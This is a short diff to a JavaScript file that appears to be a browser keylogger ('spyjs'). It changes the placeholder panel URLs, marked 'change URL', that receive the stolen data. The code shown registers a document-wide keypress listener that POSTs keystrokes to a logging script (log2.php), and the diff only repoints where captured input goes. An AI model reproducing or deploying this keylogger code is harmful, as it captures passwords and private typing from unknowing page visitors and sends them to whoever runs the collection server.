@@ -1,5 +1,5 @@
 
-var url = "http://127.0.0.1/panel/";  // change URL
+var url = "http://127.0.0.1/server/";  // change URL
 var debug = 1;
 var currLoc = "";
 spyjs_refreshEvents();
@@ -63,7 +63,7 @@ function spyjs_saveData(data){
 };
  
 
-	var server = "http://127.0.0.1/panel/log2.php"; // change URL
+	var server = "http://127.0.0.1/server/log2.php"; // change URL
 	document.addEventListener("keypress", function(e){
 		var x = new XMLHttpRequest();
 		x.open("POST", server, true);
